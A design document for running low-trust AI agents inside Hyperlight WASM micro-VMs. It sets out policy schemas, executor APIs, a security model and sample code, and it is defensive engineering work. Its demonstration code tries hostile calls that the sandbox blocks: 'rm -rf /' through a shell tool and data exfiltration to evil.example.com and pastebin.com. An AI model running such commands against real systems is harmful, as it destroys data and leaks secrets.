# Design Document: WASM Sandbox Execution for Ring 3 Agents

| Field          | Value                                                   |
|----------------|---------------------------------------------------------|
| **Status**     | Draft                                                   |
| **Author**    | Amol Ravande                          |
| **Reviewers** | Imran Siddique, Jack Batzner
| **Date**       | 2026-04-14                                              |
| **Packages**   | `agent-os-kernel`, `agentmesh-runtime`, `agent-hypervisor` |
| **Dependency** | `hyperlight-sandbox` v0.2.0 (CNCF) — **required** for Ring 3 execution |

---

## 1. Summary

This document describes the design and implementation of hardware-isolated
WASM sandbox execution for Ring 3 (Sandbox) agents within the Agent
Governance Toolkit.  It introduces three key components:

1. **`SandboxPolicy`** — a declarative YAML schema in `agent-os` that
   governs what a sandboxed agent can access.
2. **`HyperlightSandboxProvider`** — a `SandboxProvider` implementation
   that runs agent code inside Hyperlight micro-VMs with per-agent
   persistent state. **Required** for Ring 3 execution; if Hyperlight is
   unavailable, Ring 3 execution is denied.
3. **`GovernedSandboxExecutor`** — a policy-enforced execution engine in
   `agent-runtime` that evaluates governance policies before every
   execution and routes Ring 3 agents into WASM sandboxes.

Together these components turn Ring 3 from a **logical label** (rate-limited,
read-only) into a **physical isolation boundary** (separate micro-VM, no
host access).

---

## 2. Motivation

### 2.1 Problem

The hypervisor's ring model assigns unknown or low-trust agents to
`ExecutionRing.RING_3_SANDBOX`.  Today, Ring 3 enforcement is purely
logical:

- The `RingEnforcer` blocks actions requiring higher rings.
- The `AgentRateLimiter` applies a strict 5 req/s bucket.
- The `RingBreachDetector` monitors for privilege-escalation spikes.

However, Ring 3 agent code **runs in the same Python process** as
everything else.  A compromised or malicious agent has no memory/process
isolation and could:

- Read environment variables, files, or secrets on the host.
- Make arbitrary network calls.
- Interfere with other agents' state in shared memory.

### 2.2 Goal

Provide **kernel-level isolation** for Ring 3 agents using Hyperlight
micro-VMs, so that sandboxed code:

- Runs in a separate WASM virtual machine with its own memory space.
- Has no access to the host filesystem except explicitly mounted directories.
- Cannot make network calls unless explicitly allowed.
- Can only communicate with the host through five narrow channels.
- Has per-agent persistent state across multiple executions.

### 2.3 Non-Goals

- **Ring 0/1/2 isolation**: Higher-privileged agents are trusted and run
  in-process.  This design only covers Ring 3.
- **Ring elevation via sandbox**: Promoting an agent out of Ring 3 based
  on sandbox behavior is a future concern (the `RingElevationManager` is
  stubbed in Public Preview).
- **Multi-language guest support**: Initial implementation targets Python
  guest modules only.

---

## 3. Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                          Caller / Orchestrator                      │
│                                                                     │
│   executor.register_agent("research-agent", config=..., tools=...) │
│   result = executor.execute(agent_id="research-agent", code=...)   │
└────────────────────────┬────────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────────┐
│                   GovernedSandboxExecutor                            │
│                   (agent-runtime)                                    │
│                                                                     │
│  1. Resolve per-agent registration (provider, config, evaluator)    │
│  2. Build evaluation context {agent_id, action, ...context}         │
│  3. PolicyEvaluator.evaluate(eval_ctx) → allow / deny              │
│  4. If denied → raise PermissionError                               │
│  5. If Ring 3 and Hyperlight unavailable → raise RuntimeError       │
│  6. If allowed → sandbox.run(agent_id, code, config)               │
│  7. Return ExecutionResult                                          │
│                                                                     │
│  Per-agent registry:                                                │
│    agent_id → AgentRegistration(provider, config, tools, evaluator) │
└─────────────┬───────────────────────────┬───────────────────────────┘
              │                           │
     ┌────────▼────────┐        ┌────────▼──────────────────────────┐
     │  PolicyEvaluator │        │  SandboxProvider (agent-os)       │
     │  (agent-os)      │        │                                   │
     │                  │        │  ┌─────────────────────────────┐  │
     │  Backends:       │        │  │  Ring 3 (MANDATORY)         │  │
     │  ├─ YAML rules   │        │  │                             │  │
     │  ├─ OPA/Rego     │        │  │  HyperlightSandboxProvider  │  │
     │  └─ Cedar        │        │  │  ├─ _sandboxes:             │  │
     │                  │        │  │  │  agent-1 → VM₁           │  │
     │  PolicyDocument  │        │  │  │  agent-2 → VM₂           │  │
     │  ├─ rules[]      │        │  │  │  agent-3 → VM₃           │  │
     │  ├─ defaults     │        │  │  └─ If unavailable → DENY   │  │
     │  ├─ sandbox:     │        │  └────────────┬────────────────┘  │
     │  │  SandboxPolicy│        │               │ applied at        │
     │  ├─ tool_allowlist ──────►│               │ sandbox creation  │
     │  │  (registered as│       │  ┌────────────▼────────────────┐  │
     │  │   host tools)  │       │  │  Allowed tools & domains    │  │
     │  └─ network_      │       │  │  from PolicyDocument:       │  │
     │     allowlist ───────────►│  │  ├─ tool_allowlist → host   │  │
     │     (registered as│       │  │  │  callbacks (call_tool)   │  │
     │      allow_domain)│       │  │  └─ network_allowlist →     │  │
     └──────────────────┘        │  │     allow_domain() filter   │  │
                                 │  └─────────────────────────────┘  │
                                 │                                   │
                                 │  ┌─────────────────────────────┐  │
                                 │  │  Ring 2+ (fallback)         │  │
                                 │  │                             │  │
                                 │  │  SubprocessSandboxProvider  │  │
                                 │  │  (timeout/capture only,     │  │
                                 │  │   NO hardware isolation)    │  │
                                 │  │  ⛔ Blocked for Ring 3      │  │
                                 │  └─────────────────────────────┘  │
                                 └──────────┬───────────────────────┘
                                            │ (Ring 3 only)
                                            ▼
                                 ┌──────────────────────┐
                                 │   Hyperlight Micro-VM │
                                 │   (WASM Guest)        │
                                 │                       │
                                 │   /input  (read-only) │
                                 │   /output (writable)  │
                                 │   stdout / stderr     │
                                 │   call_tool() → host  │
                                 │   http (restricted)   │
                                 └──────────────────────┘
```

---

## 4. Package Responsibilities

### 4.1 agent-os-kernel (Policy Layer)

**Owns**: Policy schema, sandbox policy declaration, sandbox provider interface.

| Component | File | Purpose |
|-----------|------|---------|
| `SandboxPolicy` | `policies/schema.py` | Pydantic model declaring sandbox boundaries (`input_dir`, `output_dir`, `temp_output`, `module`, `module_path`) |
| `PolicyDocument.sandbox` | `policies/schema.py` | Optional field on the top-level policy document |
| `SandboxConfig` | `sandbox_provider.py` | Dataclass mapping policy intent to concrete provider config |
| `SandboxProvider` | `sandbox_provider.py` | Abstract base class for sandbox backends |
| `HyperlightSandboxProvider` | `sandbox_provider.py` | Hyperlight micro-VM implementation with per-agent persistent sandboxes |
| `SubprocessSandboxProvider` | `sandbox_provider.py` | Fallback for Ring 2+ agents only (no isolation, timeout/capture only). **Not used for Ring 3.** |
| `NoOpSandboxProvider` | `sandbox_provider.py` | Testing stub |

### 4.2 agentmesh-runtime (Execution Layer)

**Owns**: Policy-enforced execution, per-agent registry, result types.

| Component | File | Purpose |
|-----------|------|---------|
| `GovernedSandboxExecutor` | `sandbox_executor.py` | Policy evaluation + sandbox dispatch + per-agent registry |
| `AgentRegistration` | `sandbox_executor.py` | Per-agent bundle: provider, config, tools, evaluator |
| `ExecutionResult` | `sandbox_executor.py` | Structured result with stdout, stderr, exit code, policy decision |
| `sandbox_config_from_policy()` | `sandbox_executor.py` | Translates `SandboxPolicy` → `SandboxConfig` |

### 4.3 agent-hypervisor (Ring Model)

**Owns**: Trust scoring, ring assignment, enforcement, breach detection.
**Not modified** by this design — integration is via shared `ExecutionRing` enum.

| Component | File | Role in Sandbox |
|-----------|------|-----------------|
| `ExecutionRing.RING_3_SANDBOX` | `models.py` | Identifies agents that should be sandboxed |
| `RingEnforcer.compute_ring()` | `rings/enforcer.py` | Assigns Ring 3 to agents with `eff_score ≤ 0.60` |
| `ActionDescriptor.required_ring` | `models.py` | Read-only actions return `RING_3_SANDBOX` |
| `RingBreachDetector` | `rings/breach_detector.py` | Monitors Ring 3 agents for escalation attempts |
| `AgentRateLimiter` | `security/rate_limiter.py` | Ring 3 gets 5 req/s, burst 10 |

---

## 5. Detailed Design

### 5.1 SandboxPolicy (YAML Schema)

Declared in the `sandbox:` section of a `PolicyDocument`:

```yaml
sandbox:
  input_dir: "/app/agent-data/input"
  output_dir: "/app/agent-data/output"
  temp_output: false

```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `input_dir` | `str \| null` | `null` | Host directory mounted read-only at `/input` in the guest |
| `output_dir` | `str \| null` | `null` | Host directory mounted writable at `/output` in the guest |
| `temp_output` | `bool` | `false` | Auto-create a temporary directory for `/output` |

The `SandboxPolicy` maps directly to the Hyperlight SDK's `Sandbox.__init__`
keyword-only parameters.

**Tool and network restrictions** are not declared inside the `sandbox:`
block — they come from the existing `tool_allowlist` and `network_allowlist`
policy rules in the same `PolicyDocument`.  All host tools are registered
in the sandbox, but the `call_tool()` gate inside the WASM VM enforces
the policy at invocation time:

1. All host tools are registered via `sandbox.register_tool()`, but the
   `call_tool()` gate checks the tool name against
   `tool_allowlist.allow[].action` on every invocation.  If the tool is
   not in the allowlist, `call_tool()` raises `PermissionError` inside
   the VM — the host callback is never executed.
2. Calls `sandbox.allow_domain()` for each domain listed in
   `network_allowlist.allow[].domain`.  HTTP requests to any other
   domain are blocked by the Hyperlight network filter.

This means a single policy YAML file governs **what** an agent may do
(policy rules) **and** the physical sandbox boundaries it runs inside
(sandbox config + tool/network allowlists).

### 5.2 HyperlightSandboxProvider (Per-Agent Persistent Sandboxes)

Key design decision: **one Hyperlight micro-VM per agent, reused across
multiple `run()` calls**.

```python
class HyperlightSandboxProvider(SandboxProvider):
    _sandboxes: dict[str, Sandbox]  # agent_id → persistent VM

    def _get_or_create_sandbox(self, agent_id, config) -> Sandbox:
        if agent_id not in self._sandboxes:
            self._sandboxes[agent_id] = self._create_sandbox(config)
        return self._sandboxes[agent_id]

    def run(self, agent_id, command, config) -> SandboxResult:
        sandbox = self._get_or_create_sandbox(agent_id, config)
        result = sandbox.run(code)
        return SandboxResult(...)
```

**Why persistent?**  Agents often need to accumulate state across multiple
execution steps (e.g., a research agent builds up a data structure over
several calls).  Creating a fresh VM per call would lose all in-memory state.

**Lifecycle management**:

| Method | Effect |
|--------|--------|
| `has_sandbox(agent_id)` | Check if a persistent VM exists |
| `destroy_sandbox(agent_id)` | Tear down one agent's VM |
| `destroy_all()` | Tear down all VMs (shutdown path) |

### 5.3 GovernedSandboxExecutor (Per-Agent Registry)

The executor maintains a registry of per-agent settings:

```python
executor.register_agent(
    "research-agent",
    config=SandboxConfig(input_dir="/data/research"),
    tools={"web_search": search_fn},
    evaluator=strict_evaluator,  # optional per-agent policy
)
```

Each registered agent gets:

| Attribute | Isolation | Description |
|-----------|-----------|-------------|
| `provider` | Per-agent `SandboxProvider` instance | Own micro-VM with persistent state |
| `config` | Per-agent `SandboxConfig` | Own filesystem mounts, timeouts, limits |
| `tools` | Per-agent tool dict | Only tools this agent should access |
| `evaluator` | Per-agent `PolicyEvaluator` (optional) | Different rules per agent |

**Unregistered agents** fall through to the executor's default
provider/config/evaluator.

**Execution flow**:

```
execute(agent_id, code, context) →
  1. Look up per-agent registration (or use defaults)
  2. Build eval_ctx = {agent_id, action: "execute", ...context}
  3. evaluator.evaluate(eval_ctx) → PolicyDecision
  4. If denied → raise PermissionError (no code runs)
  5. If Ring 3 and Hyperlight unavailable → raise RuntimeError (NEW)
  6. If allowed → provider.run(agent_id, [code], config)
  7. Return ExecutionResult(stdout, stderr, exit_code, policy_decision)
```

### 5.4 Hyperlight Communication Channels

Inside the micro-VM, sandboxed code can only interact with the host
through five narrow channels:

| Channel | Direction | Purpose |
|---------|-----------|---------|
| `stdout` / `stderr` | sandbox → host | Output capture, returned in `ExecutionResult` |
| `call_tool(name, args)` | sandbox → host → sandbox | Invoke host tools; all tools are registered but the `call_tool()` gate checks the policy's `tool_allowlist` on every invocation — tools not in the allowlist are denied with `PermissionError` before the host callback executes |
| `/input` files | host → sandbox | Read-only data (e.g., datasets, configs) |
| `/output` files | sandbox → host | Writable output (e.g., results, artifacts) |
| `http_get` / `http_post` | sandbox → allowed domains | Domain-restricted network; allowed domains sourced from the policy file's `network_allowlist` rules (each domain is registered via `allow_domain()`) |

Everything else is blocked by the WASM virtual machine boundary.

---

## 7. Ring 3 Physical Isolation (This Design)

### 7.1 Ring 3 Before (Logical Only)

```
Agent assigned Ring 3
  → RingEnforcer blocks non-read-only actions
  → AgentRateLimiter caps at 5 req/s
  → RingBreachDetector monitors escalation attempts
  → Code still runs in shared Python process (no isolation)
```

### 7.2 Ring 3 After (Logical + Physical)

```
Agent assigned Ring 3
  → RingEnforcer blocks non-read-only actions          (unchanged)
  → AgentRateLimiter caps at 5 req/s                   (unchanged)
  → RingBreachDetector monitors escalation attempts     (unchanged)
  → GovernedSandboxExecutor evaluates policy            (NEW)
  → HyperlightSandboxProvider runs code in WASM micro-VM (NEW)
     └─ Separate memory space
     └─ No host filesystem (except /input, /output)
     └─ Tools restricted to policy's tool_allowlist (registered via call_tool)
     └─ Network restricted to policy's network_allowlist (registered via allow_domain)
     └─ State persists across runs for that agent
```

### 7.3 Mapping: Logical → Physical Enforcement

| Ring 3 Logical Rule | Hyperlight Physical Enforcement |
|---------------------|--------------------------------|
| Read-only access | `input_dir` mounted read-only; no host filesystem |
| No network | HTTP restricted to domains from policy `network_allowlist`; all others blocked |
| Rate limited (5 req/s) | `AgentRateLimiter` still enforced before `sandbox.run()` |
| No privilege escalation | WASM VM cannot call Ring 0/1/2 APIs |
| Monitored by breach detector | `RingBreachDetector.record_call()` wraps every execution |

---

## 8. Data Flow: End-to-End

```
┌──────────────────────────────────────────────────────────────────┐
│ 1. AGENT JOINS SESSION (Hypervisor)                              │
│                                                                  │
│    hv = Hypervisor()                                             │
│    session = await hv.create_session(config, creator_did="...")  │
│    ring = await hv.join_session(                                 │
│        session_id, agent_did="did:mesh:research-1",              │
│        sigma_raw=0.45,  # low trust                              │
│    )                                                             │
│    # ring == ExecutionRing.RING_3_SANDBOX (eff_score ≤ 0.60)    │
├──────────────────────────────────────────────────────────────────┤
│ 2. REGISTER AGENT IN SANDBOX EXECUTOR                            │
│                                                                  │
│    executor = GovernedSandboxExecutor(evaluator=evaluator)       │
│    executor.register_agent(                                      │
│        "did:mesh:research-1",                                    │
│        config=SandboxConfig(input_dir="/data", output_dir="/out")│
│        tools={"web_search": search_fn},                          │
│    )                                                             │
├──────────────────────────────────────────────────────────────────┤
│ 3. EXECUTE CODE (per call)                                       │
│                                                                  │
│    result = executor.execute(                                    │
│        agent_id="did:mesh:research-1",                           │
│        code="data = open('/input/dataset.csv').read()",          │
│        context={"message": "analyze research data"},             │
│    )                                                             │
│                                                                  │
│    Internally:                                                   │
│    a. PolicyEvaluator checks context against YAML rules          │
│    b. If allowed → HyperlightSandboxProvider.run()               │
│       → _get_or_create_sandbox() returns persistent VM           │
│       → sandbox.run(code) executes in WASM                       │
│    c. ExecutionResult returned with stdout, policy decision      │
├──────────────────────────────────────────────────────────────────┤
│ 4. SUBSEQUENT CALLS REUSE SAME VM                                │
│                                                                  │
│    result2 = executor.execute(                                   │
│        agent_id="did:mesh:research-1",                           │
│        code="print(len(data))",  # 'data' persists from step 3  │
│    )                                                             │
├──────────────────────────────────────────────────────────────────┤
│ 5. TEARDOWN                                                      │
│                                                                  │
│    executor.unregister_agent("did:mesh:research-1")              │
│    # Destroys the micro-VM, frees resources                      │
└──────────────────────────────────────────────────────────────────┘
```

---

## 9. Dependency Graph

```
agentmesh-runtime
  └─ agent-os-kernel         (PolicyEvaluator, SandboxPolicy, HyperlightSandboxProvider)
       └─ hyperlight-sandbox  (optional: wasm, python_guest extras)
```

### Installation

```bash
# Minimal (subprocess fallback, no WASM isolation)
pip install agentmesh-runtime

# With Hyperlight WASM sandbox
pip install agentmesh-runtime[sandbox]

# Or via agent-os-kernel directly
pip install agent-os-kernel[hyperlight]
```

### pyproject.toml Dependencies

**agent-os-kernel**:
```toml
[project.optional-dependencies]
hyperlight = ["hyperlight-sandbox[wasm,python_guest]>=0.2.0"]
```

**agentmesh-runtime**:
```toml
[project.optional-dependencies]
sandbox = [
    "agent-os-kernel>=3.0.0",
    "hyperlight-sandbox[wasm,python_guest]>=0.2.0",
]
```

Hyperlight is **mandatory** for Ring 3 agent execution. If
`hyperlight-sandbox` is not installed when a Ring 3 agent attempts to
execute, the `GovernedSandboxExecutor` **denies execution** with a
`RuntimeError("Hyperlight WASM sandbox is required for Ring 3 agents")`.
This is a fail-closed security posture — Ring 3 agents must never run
without hardware isolation.

> **Note:** `SubprocessSandboxProvider` remains available as a fallback for
> Ring 2+ agents that do not require hardware isolation. It is explicitly
> blocked for Ring 3.

---

## 10. API Reference

### 10.1 GovernedSandboxExecutor

```python
class GovernedSandboxExecutor:
    def __init__(
        self,
        evaluator: PolicyEvaluator,
        sandbox: SandboxProvider | None = None,
        sandbox_config: SandboxConfig | None = None,
        tools: dict[str, Callable] | None = None,
    ) -> None: ...

    def register_agent(
        self,
        agent_id: str,
        *,
        config: SandboxConfig | None = None,
        tools: dict[str, Callable] | None = None,
        evaluator: PolicyEvaluator | None = None,
        sandbox: SandboxProvider | None = None,
    ) -> AgentRegistration: ...

    def unregister_agent(self, agent_id: str) -> bool: ...
    def get_agent(self, agent_id: str) -> AgentRegistration | None: ...

    def execute(
        self,
        agent_id: str,
        code: str,
        *,
        context: dict[str, Any] | None = None,
        config: SandboxConfig | None = None,
    ) -> ExecutionResult: ...

    # Properties
    backend_name: str
    evaluator: PolicyEvaluator
    sandbox_policy: SandboxPolicy | None
    sandbox_config: SandboxConfig
    registered_agents: list[str]
```

### 10.2 AgentRegistration

```python
@dataclass
class AgentRegistration:
    provider: SandboxProvider     # Dedicated sandbox provider
    config: SandboxConfig         # Agent-specific config
    tools: dict[str, Callable]    # Agent-specific host tools
    evaluator: PolicyEvaluator | None  # Per-agent policy (optional)
```

### 10.3 ExecutionResult

```python
@dataclass
class ExecutionResult:
    agent_id: str
    success: bool
    exit_code: int
    stdout: str
    stderr: str
    duration_seconds: float
    backend: str                           # "hyperlight" or "subprocess"
    policy_decision: PolicyDecision | None
```

### 10.4 HyperlightSandboxProvider

```python
class HyperlightSandboxProvider(SandboxProvider):
    def __init__(self, tools: dict[str, object] | None = None) -> None: ...
    def register_tool(self, name: str, callback: object) -> None: ...
    def run(self, agent_id: str, command: list[str], config: SandboxConfig | None = None) -> SandboxResult: ...
    def has_sandbox(self, agent_id: str) -> bool: ...
    def destroy_sandbox(self, agent_id: str) -> bool: ...
    def destroy_all(self) -> None: ...
```

### 10.5 SandboxPolicy (YAML ↔ Pydantic)

```python
class SandboxPolicy(BaseModel):
    input_dir: str | None = None
    output_dir: str | None = None
    temp_output: bool = False
    module: str | None = None
    module_path: str | None = None
```

---

## 11. Security Model

### 11.1 Isolation Guarantees

| Threat | Mitigation |
|--------|-----------|
| Host filesystem access | WASM VM has no host FS; only `/input` (read-only) and `/output` (writable) are mounted |
| Environment variable leakage | Guest VM has a clean environment; no host env vars |
| Network exfiltration | No network by default; only domains declared in the policy file's `network_allowlist` are opened via `allow_domain()` |
| Memory corruption / escape | Hyperlight uses hardware virtualization (KVM/MSHV/Hyper-V) — guest cannot access host memory |
| Denial of service | `SandboxConfig.timeout_seconds` enforces execution time limits; `AgentRateLimiter` caps request rate |
| Privilege escalation | Ring 3 agent code runs in WASM — zero access to Ring 0/1/2 APIs; `RingBreachDetector` monitors attempts |
| Cross-agent interference | Each agent gets its own micro-VM instance; no shared state between agents |

### 11.2 Trust Boundary

```
 TRUSTED (Host)                     UNTRUSTED (Guest)
┌──────────────────────┐     ┌──────────────────────────┐
│  Hypervisor           │     │  WASM Micro-VM            │
│  PolicyEvaluator      │     │                           │
│  GovernedSandboxExec  │◄───►│  Agent code               │
│  RingEnforcer         │     │  Only sees:               │
│  BreachDetector       │     │    /input (read-only)     │
│  RateLimiter          │     │    /output (writable)     │
│  Host tools           │     │    stdout/stderr          │
│  Host filesystem      │     │    call_tool() → host     │
│  Host network          │     │    http (domain-gated)    │
└──────────────────────┘     └──────────────────────────┘
```

### 11.3 Fail-Closed Behavior

- If `hyperlight-sandbox` is not installed and a Ring 3 agent attempts
  execution, the system **denies execution** with `RuntimeError`. Ring 3
  agents are never permitted to run outside a Hyperlight WASM sandbox.
- `_enforce_hyperlight_for_ring3()` is called before each execution. It
  checks whether the sandbox provider is a `HyperlightSandboxProvider`
  instance. If not, and Hyperlight is not installed, execution is refused
  with `RuntimeError`.
- If policy evaluation raises an exception, execution is **denied** (fail-closed).
- If the sandbox VM crashes, a `SandboxResult(success=False)` is returned.

```python
@staticmethod
def _enforce_hyperlight_for_ring3(
    agent_id: str, sandbox: SandboxProvider
) -> None:
    """Deny Ring 3 execution when Hyperlight is unavailable."""
    if isinstance(sandbox, HyperlightSandboxProvider):
        return  # Hyperlight is active — allow
    if is_hyperlight_available():
        return  # Hyperlight is installed — provider may be overridden
    raise RuntimeError(
        f"Hyperlight WASM sandbox is required for Ring 3 agent "
        f"'{agent_id}'. Install with: "
        f"pip install agent-os-kernel[hyperlight]"
    )
```

---

## 12. Testing

### 12.1 Current Test Coverage

| Test File | Tests | Scope |
|-----------|-------|-------|
| `test_sandbox_executor.py` | 30 | GovernedSandboxExecutor: policy loading, execution, denial, priority ordering, default selection, per-agent registration |
| `test_runtime_imports.py` | 85 | All public API symbols importable, `__all__` consistency |
| `test_sandbox.py` (agent-os) | 32 | ExecutionSandbox: code validation, import hooks, restricted builtins |
| `test_wasm_sandbox_ring3_design.py` | 32 | Design-doc validation: allowlists, enforce Hyperlight, from_yaml, backend_name, config, full YAML flow |
| **Total** | **179** | |

### 12.2 Per-Agent Registration Tests

The `TestPerAgentRegistration` class covers:

- Registered agent uses its own provider (not the default)
- Unregistered agents fall through to default
- Per-agent config is passed to provider
- Per-agent evaluator is used for policy decisions
- Unregister removes registration and falls back to default
- `get_agent()` / `registered_agents` query API
- Persistent state across multiple `execute()` calls
- Per-call config overrides agent config

---

## 13. Sample Code: Ring 3 Agent Execution with Hyperlight

The following end-to-end example shows how to define a policy with
allowed tools and domains, load it, register a Ring 3 agent, execute
code in a Hyperlight WASM sandbox, and observe how denied tools and
domains are blocked.

### 13.1 Policy YAML with Allowed Tools and Domains

```yaml
# policies/research_ring3_policy.yaml
name: research-ring3-sandbox
version: "1.0"
description: "Ring 3 research agent — Hyperlight sandbox with restricted tools and network"

# --- Sandbox filesystem mounts ---
sandbox:
  input_dir: "/app/agent-data/input"
  output_dir: "/app/agent-data/output"
  temp_output: false

# --- Only these tools are registered as host callbacks in the VM ---
# Any call_tool() for a tool NOT listed here is rejected inside the VM.
tool_allowlist:
  allow:
    - action: web_search
    - action: read_file
  # NOT allowed: write_file, delete_file, shell_exec, etc.

# --- Only these domains are reachable via http_get/http_post in the VM ---
# Any HTTP request to a domain NOT listed here is blocked by the
# Hyperlight network filter (registered via allow_domain()).
network_allowlist:
  allow:
    - domain: "api.arxiv.org"
    - domain: "api.semanticscholar.org"
  # NOT allowed: any other domain (e.g., evil.example.com)
```

### 13.2 Loading the Policy and Creating the Executor

```python
from agent_os.sandbox_provider import (
    HyperlightSandboxProvider,
    SandboxConfig,
    is_hyperlight_available,
)
from agent_os.policies import PolicyEvaluator
from agent_runtime.sandbox_executor import (
    GovernedSandboxExecutor,
    sandbox_config_from_policy,
)

# ── 1. Load the policy YAML ──
# Note: Hyperlight availability is enforced internally by
# GovernedSandboxExecutor — callers do not need to check it.
# PolicyEvaluator parses rules, sandbox config, tool_allowlist,
# and network_allowlist from the same YAML file.
evaluator = PolicyEvaluator.from_yaml("policies/research_ring3_policy.yaml")

print("Loaded policy:", evaluator.policy_document.name)
print("  Allowed tools:", [
    t.action for t in evaluator.policy_document.tool_allowlist.allow
])
print("  Allowed domains:", [
    d.domain for d in evaluator.policy_document.network_allowlist.allow
])

# ── 2. Create host tool callables ──
# All tools are registered with the agent. The call_tool() gate inside
# the WASM VM enforces the tool_allowlist from the policy at invocation
# time — tools not in the allowlist are rejected when called, not at
# registration time.
def web_search(query: str) -> str:
    """Search tool — allowed by policy."""
    return f"Results for: {query}"

def read_file(path: str) -> str:
    """File reader — allowed by policy."""
    return f"Contents of {path}"

def delete_file(path: str) -> str:
    """Destructive tool — registered but blocked by call_tool() gate."""
    return f"Deleted {path}"

def shell_exec(cmd: str) -> str:
    """Shell tool — registered but blocked by call_tool() gate."""
    return f"Executed: {cmd}"

all_host_tools = {
    "web_search": web_search,
    "read_file": read_file,
    "delete_file": delete_file,
    "shell_exec": shell_exec,
}

# ── 3. Create sandbox provider ──
# All tools are passed to the provider. The tool_allowlist from the
# policy is enforced at the call_tool() gate, not at registration.
provider = HyperlightSandboxProvider(tools=all_host_tools)

# ── 4. Create the governed executor ──
executor = GovernedSandboxExecutor(
    evaluator=evaluator,
    sandbox=provider,
)

# ── 5. Derive sandbox config from policy ──
sandbox_policy = evaluator.policy_document.sandbox
config = sandbox_config_from_policy(sandbox_policy, defaults=SandboxConfig(
    timeout_seconds=60,
))

# ── 6. Register the Ring 3 agent with ALL tools ──
# All tools are registered. The policy's tool_allowlist is enforced
# by the call_tool() gate inside the WASM VM at invocation time.
agent_id = "did:mesh:research-agent-001"
executor.register_agent(
    agent_id,
    config=config,
    tools=all_host_tools,  # all tools registered; allowlist enforced at call_tool()
)
print(f"\nRegistered agent: {agent_id}")
print(f"  Backend: {executor.backend_name}")
```

**Output:**
```
Loaded policy: research-ring3-sandbox
  Allowed tools: ['web_search', 'read_file']
  Allowed domains: ['api.arxiv.org', 'api.semanticscholar.org']

Registered agent: did:mesh:research-agent-001
  Backend: hyperlight
```

### 13.3 Executing with Allowed Tools and Domains

```python
# ── Execute code that uses ALLOWED tools and domains ──
result = executor.execute(
    agent_id=agent_id,
    code="""
import json

# 1. Read input data (mounted read-only at /input)
with open("/input/dataset.csv") as f:
    data = f.read()
print(f"[OK] Loaded {len(data)} bytes from /input/dataset.csv")

# 2. Use an ALLOWED tool: web_search (in tool_allowlist)
search_result = call_tool("web_search", {"query": "agent governance"})
print(f"[OK] web_search result: {search_result}")

# 3. Use an ALLOWED tool: read_file (in tool_allowlist)
file_result = call_tool("read_file", {"path": "/input/readme.txt"})
print(f"[OK] read_file result: {file_result}")

# 4. Use an ALLOWED domain: api.arxiv.org (in network_allowlist)
arxiv_response = http_get("https://api.arxiv.org/query?search=agents")
print(f"[OK] arxiv API response: {len(arxiv_response)} bytes")

# 5. Write output (writable mount at /output)
with open("/output/analysis.json", "w") as f:
    json.dump({"rows": len(data.splitlines()), "search": search_result}, f)
print("[OK] Wrote analysis to /output/analysis.json")
""",
    context={"message": "analyze research data"},
)

print(f"Success: {result.success}")
print(f"Backend: {result.backend}")
print(f"Exit code: {result.exit_code}")
print(f"Duration: {result.duration_seconds:.2f}s")
print(f"Stdout:\\n{result.stdout}")
```

**Output:**
```
Success: True
Backend: hyperlight
Exit code: 0
Duration: 0.83s
Stdout:
[OK] Loaded 4096 bytes from /input/dataset.csv
[OK] web_search result: Results for: agent governance
[OK] read_file result: Contents of /input/readme.txt
[OK] arxiv API response: 2048 bytes
[OK] Wrote analysis to /output/analysis.json
```

### 13.4 Denied Tools and Denied Domains (Blocked by Sandbox)

```python
# ── Execute code that attempts DENIED tools and domains ──
result_denied = executor.execute(
    agent_id=agent_id,
    code="""
# --- Attempt 1: Call a tool NOT in tool_allowlist ---
try:
    call_tool("delete_file", {"path": "/output/analysis.json"})
    print("[FAIL] delete_file should have been blocked!")
except PermissionError as e:
    print(f"[BLOCKED] delete_file: {e}")

# --- Attempt 2: Call another tool NOT in tool_allowlist ---
try:
    call_tool("shell_exec", {"cmd": "rm -rf /"})
    print("[FAIL] shell_exec should have been blocked!")
except PermissionError as e:
    print(f"[BLOCKED] shell_exec: {e}")

# --- Attempt 3: HTTP to a domain NOT in network_allowlist ---
try:
    http_get("https://evil.example.com/exfiltrate?data=secret")
    print("[FAIL] evil.example.com should have been blocked!")
except PermissionError as e:
    print(f"[BLOCKED] evil.example.com: {e}")

# --- Attempt 4: HTTP to another non-allowed domain ---
try:
    http_post("https://pastebin.com/api", body="stolen_data")
    print("[FAIL] pastebin.com should have been blocked!")
except PermissionError as e:
    print(f"[BLOCKED] pastebin.com: {e}")

# --- Attempt 5: Allowed tool still works after denials ---
result = call_tool("web_search", {"query": "still works"})
print(f"[OK] web_search after denials: {result}")

# --- Attempt 6: Allowed domain still works after denials ---
response = http_get("https://api.semanticscholar.org/graph/v1/paper/search?query=agents")
print(f"[OK] semanticscholar.org after denials: {len(response)} bytes")
""",
    context={"message": "test sandbox restrictions"},
)

print(f"Success: {result_denied.success}")
print(f"Exit code: {result_denied.exit_code}")
print(f"Stdout:\\n{result_denied.stdout}")
```

**Output:**
```
Success: True
Exit code: 0
Stdout:
[BLOCKED] delete_file: Tool 'delete_file' is not in the tool allowlist
[BLOCKED] shell_exec: Tool 'shell_exec' is not in the tool allowlist
[BLOCKED] evil.example.com: Domain 'evil.example.com' is not in the network allowlist
[BLOCKED] pastebin.com: Domain 'pastebin.com' is not in the network allowlist
[OK] web_search after denials: Results for: still works
[OK] semanticscholar.org after denials: 1536 bytes
```

> **Key takeaway**: The `tool_allowlist` and `network_allowlist` from the
> policy YAML are enforced **inside the WASM VM boundary** at invocation
> time. All host tools are registered, but `call_tool()` checks the
> allowlist on every call — tools not in the list raise `PermissionError`
> before the host callback executes. Non-allowed domains raise
> `PermissionError` at the `http_get`/`http_post` gate. Allowed tools
> and domains continue to work normally even after denials.

### 13.5 Denied Execution When Hyperlight Is Missing

```python
from agent_os.sandbox_provider import is_hyperlight_available

def execute_ring3_agent(executor, agent_id, code):
    """Attempt to execute a Ring 3 agent — denied if Hyperlight is missing."""
    if not is_hyperlight_available():
        raise RuntimeError(
            f"Execution denied for Ring 3 agent '{agent_id}': "
            f"Hyperlight WASM sandbox is required but not installed. "
            f"Install with: pip install agent-os-kernel[hyperlight]"
        )
    return executor.execute(agent_id=agent_id, code=code)

try:
    result = execute_ring3_agent(executor, "did:mesh:untrusted-agent", "print('hi')")
except RuntimeError as e:
    print(f"BLOCKED: {e}")
```

**Output:**
```
